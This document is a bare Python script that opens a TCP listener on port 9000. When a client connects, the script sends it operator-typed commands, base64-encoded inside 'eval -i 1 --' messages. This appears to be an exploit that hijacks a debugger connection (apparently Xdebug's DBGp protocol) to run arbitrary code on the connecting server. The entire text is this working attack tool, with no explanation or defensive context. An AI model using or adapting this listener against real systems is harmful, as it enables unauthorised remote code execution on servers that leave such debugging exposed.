import socket
import base64

ip_port = ('0.0.0.0', 9000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()

while True:
    client_data = conn.recv(1024)
    print(client_data)

    data = input('python_cmd >> ')
    encoded_data = base64.b64encode(data.encode())
    conn.sendall(b'eval -i 1 -- ' + encoded_data + b'\x00')
